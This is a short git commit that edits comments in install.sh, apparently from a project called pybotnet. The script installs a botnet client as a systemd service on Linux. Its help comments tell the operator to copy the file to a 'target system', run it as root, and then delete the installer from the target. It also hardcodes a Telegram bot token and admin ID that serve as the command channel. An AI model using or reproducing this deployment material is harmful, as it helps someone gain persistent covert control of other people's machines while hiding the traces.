5ef9cacbfb2cd119cfb307c814992d184f0462dd
onionj <onionj98@gmail.com>
2022-06-12 00:42:15 +0430

    fix typo

--- install.sh
+++ install.sh
@@ -1,15 +1,14 @@
 #!/bin/sh
+
 ## add pybotnet to linux systemd service ##
 
-# --HELP--:
-# replace youre telegram_bot_token, admin_id and with your own;
-# copy this file to target system;
-# run this file as root;
-# remove install.sh from target system;
-
+# -- HELP--:
+# - replace youre telegram_bot_token, admin_id and bot_alias_name with your own
+# - copy this file to target system
+# - run this file as root
+# - remove install.sh from target system
 telegram_bot_token=5526760482:AAGweoNtLrHEssdcvLC6whjms78yU8gEO6w
 admin_id=7902347166
-
 bot_name=example_bot_name
 
 
